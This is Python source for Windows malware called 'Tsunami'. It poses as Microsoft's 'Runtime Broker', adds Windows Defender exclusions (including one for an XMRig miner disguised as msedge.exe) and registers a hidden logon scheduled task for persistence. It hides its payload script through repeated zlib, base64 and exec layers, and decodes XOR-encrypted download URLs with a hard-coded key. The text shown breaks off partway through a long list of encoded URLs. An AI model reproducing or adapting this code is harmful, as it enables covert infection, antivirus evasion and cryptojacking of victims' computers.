from cryptography.hazmat.primitives.asymmetric import padding
import urllib.request
import urllib.parse
import subprocess
import tempfile
import binascii
import ctypes
import random
import string
import base64
import zlib
import time
import gzip
import json
import ssl
import sys
import os
import re

##### Globals #####

DEBUG_MODE = False

ROAMING_APPDATA_PATH = os.getenv("APPDATA")
LOCAL_APPDATA_PATH = os.getenv("LOCALAPPDATA")

TSUNAMI_PAYLOAD_NAME = "".join([random.choice(string.ascii_letters) for i in range(16)])
TSUNAMI_PAYLOAD_FOLDER = tempfile.gettempdir()
TSUNAMI_PAYLOAD_PATH = rf"{TSUNAMI_PAYLOAD_FOLDER}\{TSUNAMI_PAYLOAD_NAME}"

TSUNAMI_INSTALLER_NAME = "Runtime Broker"
TSUNAMI_INSTALLER_FOLDER = rf"{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications"
TSUNAMI_INSTALLER_PATH = rf"{TSUNAMI_INSTALLER_FOLDER}\Runtime Broker.exe"

TSUNAMI_PAYLOAD_SCRIPT = '''
RandVar = '?'

##### Imports #####

import subprocess
import datetime
import ctypes
import os

##### Globals #####

DEBUG_MODE = False

ROAMING_APPDATA_PATH = os.getenv("APPDATA")
LOCAL_APPDATA_PATH = os.getenv("LOCALAPPDATA")

TSUNAMI_INSTALLER_NAME = "Runtime Broker"
TSUNAMI_INSTALLER_FOLDER = rf"{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications"
TSUNAMI_INSTALLER_PATH = rf"{TSUNAMI_INSTALLER_FOLDER}\Runtime Broker.exe"

##### Utils #####

def output(text: str) -> None:
    if DEBUG_MODE:
        print(text)

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

##### Tsunami Payload #####

def add_windows_defender_exception(filepath: str) -> None:
    try:
        subprocess.run(
            ["powershell.exe", f"Add-MpPreference -ExclusionPath '{filepath}'"],
            shell = True,
            creationflags = subprocess.CREATE_NO_WINDOW,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            stdin = subprocess.PIPE
        )

        output(f"Added a new file to the Windows Defender exception")
    except Exception as e:
        output(f"[-] Failed to add Windows Defender exception: {e}")

def create_task() -> None:
    powershell_script = f\"\"\"
        $Action = New-ScheduledTaskAction -Execute "{TSUNAMI_INSTALLER_PATH}"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
        $Principal.RunLevel = 1
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
        Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -TaskName "Runtime Broker"
                         \"\"\"

    try:
        subprocess.run(
            ["powershell.exe","-Command", powershell_script],
            check = True,
            creationflags = subprocess.CREATE_NO_WINDOW
        )

        output("[+] Successfully created the task")
    except Exception as e:
        output(f"[-] Failed to create the task: {e}")

##### Application Entry #####

if __name__ == "__main__":
    # Check if we are an admin

    if not is_admin():
        output("[WARNING] Not running as an administrator")

    # Add the Windows Defender exceptions

    EXCEPTION_PATHS = [
        # Tsunami Installer
        rf"{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe",
        # Tsunami Client
        rf"{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe",
        # XMRig miner
        rf"{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\msedge.exe"
    ]

    for filepath in EXCEPTION_PATHS:
        add_windows_defender_exception(filepath)

    # Create the task

    create_task()

    # Keep the window open in debug mode for analysis

    if DEBUG_MODE:
        input()
                         '''

##### Obfuscator #####

zlb = lambda in_ : zlib.compress(in_)
b64 = lambda in_ : base64.b64encode(in_)

def obfuscate_script(data: str, loop_count: int) -> str:
    # Change the value of the random variable to ensure different obfuscation strings each time

    data = data.replace("RandVar = '?'", f"RandVar = '{random.randint(100000, 10000000)}'")

    # Setup obfuscation

    xx = "b64(zlb(data.encode('utf8')))[::-1]"
    prefix = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"

    # Perform obfuscation

    for i in range(loop_count):
        try:
            data = "exec((_)(%s))" % repr(eval(xx))
        except TypeError as s:
            sys.exit(" TypeError : " + str(s))

    # Build the complete output

    output = ""

    output += "\\n"
    output += prefix
    output += data
    output += "\\n"

    # Return the output

    return output

##### Utils #####

def output(text: str) -> None:
    if DEBUG_MODE:
        print(text)

def is_task_scheduled(task_name: str) -> bool:
    powershell_command = f"Get-ScheduledTask -TaskName '{task_name}'"

    result = subprocess.run(
        ["powershell.exe", "-Command", powershell_command],
        creationflags = subprocess.CREATE_NO_WINDOW,
        capture_output = True,
        text = True
    )

    if result.returncode == 0 and result.stdout.strip():
        return True
    else:
        return False

##### URL Downloader #####

def xor_encrypt(text: bytes):
    XOR_KEY = b"!!!HappyPenguin1950!!!"

    encrypted_text = bytearray()
    for i in range(len(text)):
        encrypted_text.append(text[i] ^ XOR_KEY[i % len(XOR_KEY)])
    return bytes(encrypted_text)

def xor_decrypt(text: bytes):
    return xor_encrypt(text)

def decode(encoded: str) -> str:
    encoded_bytes = binascii.unhexlify(encoded)
    encoded_bytes = xor_decrypt(encoded_bytes)
    encoded = base64.b64decode(encoded_bytes).decode()

    return encoded[::-1]

def download_installer_url() -> str:
    URLS = [
        "6f5b427a2c1e221532542c0b112e024b5b5e09476f4b78596c7a540012211a0d3c543b050c76007c7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e75607c2e27261532083834165a3c41606354476c7574586c1f541c2a3c0617375533103f4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f75467b2f1d3e0334205b54175b5b7d614f61126c4b6b4d430f271f264a1a1c3432061f0a62004152136c54434c4d213b282203093d2f1139131e4b5a7d621140601c1c",
        "6e75647c2c27260c330b022410071e596a5908146f5b7458450f544123311a09370a44583a5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f65787a2c1e3e030a3d24362f2e384458606a476c7564106c262f0713493c110c54272b22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c5b787c2f2822153222160f2407204b606001476f4b60126c7b0d1c114b1e133d20441f0c0056435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c4b70782f433e15322202322f3e20596c7308566f757414781f54002a4b1632370a3306346770435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b78322c422a143257382f1604385a6062096c795b705b6c220d00292e1a543c204c1c37640d435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6e65603f2c1d26103430201d175b0272614f57136e754d5b7b0f541c254b241037301d3c22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c5b70782c42260a34332410113e5765614f5b116f65674f401f3b0512491e130d0a11053a5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c5b687c2c281c0034321e12263e3c5d5d7d6251734d19106c3202411314065337300d2a0c765d40627218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f5b703f2f3822030a325b172707245d5b72484d721019586c3220422a21061d0d554c270a766f59624818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f654a782e37080a313d3c3310045b595a5e6a476c7542156c25371912481a0b0c0a19590c010d435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c4b78312f433e0b09572834165b384260637e476f5b705b6e100d1b2a3e06300a2040050c666f717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e75647d2e37180331325b172704385b63626658731019116c222c09292e650d37093f3f34666b455313146b6d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6e75747a2c27260332542c0c143e5703686308586c5b6413400f2f40112134310c0a3305370101435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f75747b2f4241480a3d2056213e28056362484d701019146f1c38411314060e0c0a233c0d0273596a664d726d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6f4b787a2f37360c31320a0f2021205d58075c6c795b6c116f32370a131406503a3f271334675a435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f4b46312f1e3e15320b3857263e3c59636d7a4e776719116e1c200a2a3e69123d3f3f050c660804655818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c4b427a2c1e1c0032573808232e38445c627670795b78106f1c270a121416573c3f3b1f347600607c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f4b6c7c2f4226133132340a215a24475d727e4d726719566c320a422a4b69163730192c0c76555d647218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c4b6c782c1d1803093d24232f5b5b415d587668795b78126c1c2f40134b060f0c0c19130b667f06526464574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c7568322e37264931301a10175b575b6c0408596f5b6014427a271c1312161f0d203f2522026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c7542792c433e490932063f142e2059636d7a62795b74566e0c27032a210a0d0d0b271334026f7b7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c6546312f420811312d3c0b21212042606d6a51744d19156e1c3040134a02150d55193e346973045466676e6d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6f65603f2e372612313320572c3e385e6f0408146c5b4a59407a2f182114690b0c0a332722026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f5b707b2c1e3e0e31320623165b0a00685908596f4b6c14407a5806214b060f0c204c2c22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f4b427c2c273613313d240a243e285f63620171795b6c5b6f323745124b1a560c573b050a767f5c6a7470574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f5b687d2e273a0034322456205b384858627652701019136c0c0209143e650d3f5419590d026f667c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c7542792e38320f312d201724043c5d5d7d7a57741019596e1c38081314690a0a2f232b34660845646218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f5b60792f2718490a080220103e1a5b5b047a476e6560156c7b2f40112e161c382f3b1334697305655818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c7546322c42360c31305b5717042869614f69126f7577587b1f374125211e090f2f3b583b7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c4b60782f38140f33080632145a24596c73085b6f4b6c134325371c26311e1c3430271c3f6200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c4b60302c1e3a0f323d382e2f2124595c585c79795b64106c22331c134b65093c2f3f050a5c00717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f75647b2c27450f313d3c1121313c4b636005476f7570156f26051c131402103f3033590c5c7f617c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c5b4a3f2e383e1534222814202e384258620175795b46126c1c371b2a211a0d0f213b020c767f40521170574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f5b687b2c1d3e09322d240f275a245d635b7a10741019586c0c3841121469150d54232e0b66415952764d746d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6c65683f2f383e15323228142707245d63725c79795b42136f22050a2a311a13385427593769556d7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e65427a2f27260c0a32381e275b20415d7d7e10744d19146f3234402a2e3410373f3f2134665d5d524c676f6d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6c7574322c27260a0a575b25173e28006b04085b6e756011787a0d05124a1a2f34301110386200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c4b787d2e283e0b09570257205a06595b726672795b6c146e1c2745123e28543c0a111c346651717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c5b427b2c1d080909305f1d2f31384463636a476e7574586e102b1c14311e133c093b1b37035546615818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f4b6c7c2f1e1c493208385423210242586048476f656c566e0f151a14211a553b550d1a34695d43646218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c65643f2e274515342d3c56210702015a720167795b74146c222b1c2a4b02543d0a23590a6677777c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f4b6c7b2e383e150a225729112e5b5d680408126f4b685b427b2b1c152106260a5533133403557e7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f5b4a302e372649093216362f3124475b58546b795b42136f0c33181214061c3f3f270334697b4f617218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f6570312f3832003255201517213878614f71566c4b4554437a0d05244b06100a31241f0a62004152136c54434c4d213b282203093d2f1139131e4b5a7d621140601c1c",
        "6f4b467a2f37490a322257102431205c63625c4e7010195b6f0c0244292e650d3c2f19100c03417d7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e756c302e382209322d2c33103e165a60624869795b4a156f0c271c122e28153c0a40010f69735e617218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c754a782c27221132320625172e28015b586664795b6c156c322f02294b3c290d54271c0f6973647c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f756c3f2e27080a0a330a52175b24025b057e476e7570106e0f370a142e0a093b0919100f697b01627218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6e654a792e37410f3420281d11312073614f69586c75675443260d3d134a06120c30332d22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6e7574302f381c00313228221621384260625c64795b68586f0c2f03123e3c2937554019395800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b70312c27260d0930340b173102075b5e66476f4b60106c2554092a2c1a0e343f3f1937645e435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c5b42302c433e12320802202f313c00606058476e7570136f102f40142c695537304c1a3c5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f5b707c2f283a1534225b212f2e3843586048476c65605b6c25191814211623342023053a5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c75747c2f1e1c0a0a321a1721213c48606d7263795b4a5b6f1c0d45143e3c1037312f130f037f59646218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c6574782c1e3e483422572a165a24475b580964795b785b6f323b1c134b69360d0927593f6200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c7578782f383a1534223829165b384b5a0576476c656c126c7b3300122c691f375519100b644e435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b783f2e283e4c31232c57165b2860614f79136f65675b7b103318224a3413342033063b4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c5b747c2c1e3a0f323d3832160438035b0548476f656c146f7b2f1b12143c2b342040050c647c435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c65603f2f1e3a4933570a1d213102485d624054727719596c323440152e61090d0a23220d027745526468574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c65787b2e283e15330b0232142120415a5e5c476f6560126c7a54091249380d0c2023070c5a7c435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b68302c2722003257200b2007205d5d6d7e5b727719596f1c2c412a2e06093d3f2710346641777c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c4b607a2c4222110a3206252f3e2044606d7a74795b60126e1c2f1c121469260c551110376460435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f6578302e2726123132200b2721204460637e476c6568146c253704124b65093c5523030f66005a615818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f75603f2f27410f32553c572f3e1658606362476c756c146f1f3305112c1a093455331d376468435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f6564302c27140c3132380b205a024863620551771019146c0c34432a2102543f543b1b37030046614818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c5b6c312c433e483522382a2f31244763586662795b70156f1c33052a210a35370a33103c4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c756c7c2f1e3e0a0a323c1121313c595b057e476e6560126c7a5406112c28500c200d2b22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6e7560782f27180309300657172e5766614f69146f656f52430f0d3c134b061c37301d3d22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c65747c2e283e0f342d38252c3e5f5f58637e476f5b74596c7b2f051248021f0f3040053c7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c65607b2e272600343d20122731205b586d6256751019126c2206442a211a0d0a57335c37664159626218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f75647d2c283e123308282310313c59636d7a74795b68146e1c3b072a2e0629343f3b190a6973717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e75467d2f27360009085723175b5b415a077665795b64126f0c371c294b3c08340c4c050d5c7f707c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e6560302f1e3e170930240d14313c01686308156f4b6459427b2300131502550c554c2a22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c4b46792f42364909323c30170438015a075c6c795b70156c0c2f1c294b65350a2f3b05340355707c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f5b74782f1d040031301a082c3e386b614f79156c654557787a0d23134b61540d0a4c2e22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f5b4a7c2c1e3a1534225730103e16486062666e795b74586c1c330a122e692b37300113376641777c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e65607b2c1e3e1133575b0f265b16006358665b777719156f220642291428543f09191a0d760845655818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f5b68792f1d450f33572056232e2848637205497410195b6c0c2844292102093f093b5a376973707c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c5b68312f1d2613313d2c332f5b5b415d72766f795b6c5b6f32370a292e3c260b30401c0c0074435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6e654a322f433e000a32340b20041a5b606d7a65795b6c586c222f18133e610d38203b130a740d435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f7542322c1d22150a220225103e5f5d5b5e66476f4b425b6f7b331c2a211a2d0c5427580c7778435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c75707d2e27080f0a20021d14213c4858607a476c7564596e0f3702292f1e0a0a2f3f1f3a5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c6568792f372a0a0932060b2407024863636a476c5b785b6e102f1b12141626342019010d006c435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c4b747d2e381c0c320838362f3e5b416b5908596c657458427a2709224b16540d32301f0a62004152136c54434c4d213b282203093d2f1139131e4b5a7d621140601c1c",
        "6e75423f2e2822093433280c17040265614f79146e75451445000900254b02160c57451f0a62004152136c54434c4d213b282203093d2f1139131e4b5a7d621140601c1c",
        "6f6568792f1d18133208281e2407245d587d6267795b78156f0c091d2a2e1e150c0b23010c6608737c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e6578302f27264b33083833175b2047680408106f7574107b1f54002a1406200d5540010c7778435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6e65467a2c1e3e1032551e1d112e2875614f57156f4b6f5b42253745123c0a1c343f2f0134675a435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f7560782e27260d0932162414213c005b045c476c7560596c102b1c2a3e65093c553b05375c6f04657218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c65463f2c42264b093d3c0d215b5b595d075c49776719596f222445131406113732110534765546655818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f4b427d2e383e0f0956240f21313c5b606d5867795b64146c220d0a143e160a38551d130c0156435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c75427c2c42081134222820112e165d6b5908566c656810430f19002214281537321a1f0a62004152136c54434c4d213b282203093d2f1139131e4b5a7d621140601c1c",
        "6c656c792c27451533570234112e3844606040476f756c566f1f090a112e28133b2f1910376409435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c5b607d2f383e0009323810205b5f595b7d7e6b795b46596c220d0a2a2102153f543b580c03085d624818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c5b427b2c27140c313d2031103e164260637a476f4b4a106e0f370529211e103d3023133769735a656218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f7568782f42080d3422063e112e065f5d620962795b68156c0c050a2a311a0d0a32111c34696b05547415574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f5b64782f42264832222830165a3c5c586054476e7564116e0f3318124b2812383f27190a6774435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b703f2f3800493132241e215b38415a066675795b64566f0c3306123e060b0c0c33130a7641046a6464574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f5b46782e27450909300a122f3e0a045c7009476e756c5b6e0f330312491a093755331a376778435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c4b78792e383e490a08281e245b3803606d7a69795b6c596e0c2f092a210a133a30231c0f664140645818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f656c3f2f381c163422161727043803606d7a62795b68596f0c090a114b1e130c223f100c0277406a776c574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f6578312e383a153156240f2021245d5d580965795b74156f220d1c1414162c3420231c0d5c7f737c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c4b787d2e37264909305f122f5b0242686308156e756c127b0f541c254b1a1c3432121f0a62004152136c54434c4d213b282203093d2f1139131e4b5a7d621140601c1c",
        "6e75467c2c1e3e0a0a3d340b212e385b5b585c58746719126c320209134a12110a3137053476554f617218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f7574782e37260009080220172e165d6f7308146c4b6011427a37051248205134300d04346770435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c6578302f1d45093222571723043843606d6275795b78146c323b1c151465130d0c3f1d34666f617c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f7560782e383a4832575f1e243e0a44586d72577267195b6c220244131406550a324c590d760859556474574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6e75787b2c431c0a320e570917040243586058476c6564566c7b2f1c122e162a0d543f050a5c007b7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c4b74782f383e150a220256275b0a005b7372476c4b46126f002f05112e161c382023100f660007637218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6e7546782f27260a3256240f245a20425b7d6670795b465b6f1c3b1b123e062c0f543f1f3f4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e75687d2f1d3e0932082017202e2844586d6249756719586c322c42123e3c573c3033020c5c007c7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e75463f2e28220a093206332f2e384360075c79795b46136e1c0d05124a0216373111050f665d5b697411574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c7574782e383e103132163e103e2048636001476c7568156e1f331c143e3c0d38543b590f696f617c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c65707d2c283e480956240f2131245d5d585c6c795b68136c32054129211e1f0f323f5c0a76555e547415574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f4b467a2c283e0b32082834170457015b725c6f795b68566f3205092a2e34540d0c01593766004c516770574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c7564792c272613093d2c332c3e024b686308586c4b7011427b331c2a2c611f0c2f372722026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c6568302e37140c0930240f2c5b0262614f7d136c5b4d5742252704292c1e0c0c30191a3f4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b4a792c433e1531323c112404575d5a5962476c4b60126e0f3704124b1e103d3f3b5c376973607c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e6564312e27360d3432281e2321204b636d7a70795b68596e1c3345123134130c213b050a765507627218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c5b427b2c422a15330e060917040204606372476c5b64156c1f581a112f1a500a2f232c22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f756c322c422612313224251704575f5b0548476f756c146f001140292c241c0c55195b376774435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f4b42792c1e1c0a0a222833160438015d72666c795b4a106c0c2f1b2a210a153a2f3b1e37697305655818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f6546312c42084c32080230103e2458586048476f4b46156f252f00143112350c0a19013b7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e65787d2c1d260a342d3c0b205a02585b0462476c5b64126c7a371b112f1e163730111c0a6460435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6e6542322c1d22153157160f235a205a5b5b6666795b4a116c0c3b031231062a0b300d020d5c7f7c7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c6542322c1d261332082808245a3c595b074866795b68586c1c3b401314162937543b593a5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b78782c42360d0a5702332f2e38026d0408586e754a127b1f0d0512143c2b342f3f1934675a435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f7542782f27451534083814273e3c5d5d720957744d19156c0c2c40153e061f0d54233d0b66414c6a797b716d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6f4b707a2f383a15322d3834175b2445606001476f656c566f1f3305112f340e0f3f37193a7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c754a7c2c1d260d343d200b20073c485b067275795b68156c0c2b06143e690a3b2f191a0c5c555d647218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f75707d2c274509093d0a32165a38485b075865795b78586c22271c1214061c3d304c5937660843666218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6e7564322f4208110a33241d17042801586362476e7578156f26330612491a0b0c0a19190f0074435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c6560312f4226490932240b200438585b074869795b60156f3205181214061634321d1334665541534a64574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c6564782c27260a093320082c5b285d5a5e7a476c7570136f7b2f18134b650d3d5527100f6651607c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f75607c2e383e0d33082820165b0a5d5a7001476e7546126c262341123e16153c203b130f6409435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f75707b2f1e2209320938522c3124016c0408596f5b7813437a581f292f3c1c0c543b100a6474435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c75603f2e281c11330e0a131604285e680408106f65745b441f27432a3e3c2b0c2023053d7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f6564312f37220c0932161120213c5b6362484d7410195b6e1c2842134a34133b09371f0f797745614818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c4b42312f2745090930200b173e025f63637a476c6542596f0f370a13170621345540190f7768435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b6c312e283e4932085720112e384b5a7366476e65645b6f102f1c112e1a0d3f093b05347655617c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c65687c2c1e221532222411275a2c005a720970795b68136c32051a112e38210b30231a0c747c435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6e65647b2c1d22153357280b245b28015a075c76795b60106c322f0a2a4b651538543b050d5c0c59625818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6e65607d2c431c033430241e2f3e3c595a5962476f4b4a586c100d1b12491e0e0f303313386200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c65427a2f42450f3232160f205b064b5a58766f795b60106f222b03123e16113b543f1f0a7677777c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c654a7b2f283e15323216112621205a6362666c795b70156f220506122e69210d0a2302347655767c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c7570312f281c1333083829170402596d6308146e656c12450f541c242e65090f303f1d3f6200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c7560792c281c1034332457170438015c7066476c5b6c136f250506123e16103f3f3f050f796b657c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e6542792e283a0f090b2425165b0203606d7a74795b42596c22090a134b161c3c550d01370300787c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f6546782f42360a0a325f0f20212002636040476f65705b6c262f40292102310b300d1a0c03516d7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e7574782f38140f330b240f21043c425d62094e741019586f0c0242113e34153d2027050d5c55607c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c65787b2c1e3e0d3308573f165b1a44606362476c7578106c262f07292c61103730401f3f4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e65467a2f1d4509093d24242f3e3c476d63085b6c4b7411430f1918294b06360c20331e3a4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
